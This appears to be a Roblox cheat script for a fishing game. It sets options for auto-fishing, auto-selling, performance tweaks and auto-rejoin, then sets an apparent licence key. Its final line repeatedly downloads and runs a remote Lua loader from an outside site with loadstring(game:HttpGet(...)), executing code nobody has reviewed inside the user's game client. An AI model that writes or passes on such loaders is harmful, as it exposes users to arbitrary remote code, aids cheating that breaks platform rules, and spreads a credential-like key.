repeat task.wait() until game:IsLoaded()
getgenv().Config = {
	["AutoSave"] = true,
	["Character"] = {
		["Disable Swim"] = true
	},
	["Auto Fish"] = {
		["Enable"] = true,
		["Safe Whirlpool Zone"] = true,
		["Fish Location"] = {
			["Manual"] = true,
			["Auto"] = true,
			["Zone"] = "Vertigo",
			["Height"] = 10,
			["Postion"] = "-91.2283249, -751.813477, 1205.03418, 0.898936927, 0.00505644642, -0.43804878, 3.53068188e-08, 0.999933362, 0.0115424749, 0.438077956, -0.0103759198, 0.898877084"
		},
		["Cast Threshold"] = 95,
		["Perfect Chance"] = 50,
		["Fail Chance"] = 5
	},
	["Performance"] = {
		["Fullbright"] = true,
		["Boost FPS"] = true,
		["Black Screen"] = true
	},
	["Inventory"] = {
		["Auto Favourite"] = {
			["Weight"] = 1000,
			["Enable"] = true,
			["Unfavourite if unmatch"] = true
		},
		["Auto Sell"] = {
			["Enable"] = true,
			["Delay"] = 3,
			["Rarity"] = {
				["Legendary"] = true,
				["Event"] = true,
				["Mythical"] = true
			}
		}
	},
	["Auto Merlin"] = {
		["Lucky"] = true
	},
	["Performance Failsafe"] = {
		["Rejoin Timer"] = {
			["Minute"] = 60
		}
	}
}
getgenv().Key = "wPfsNXRRMazroqcwmxPIUwPcGvwkRZer"
repeat wait(2)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(6)until Joebiden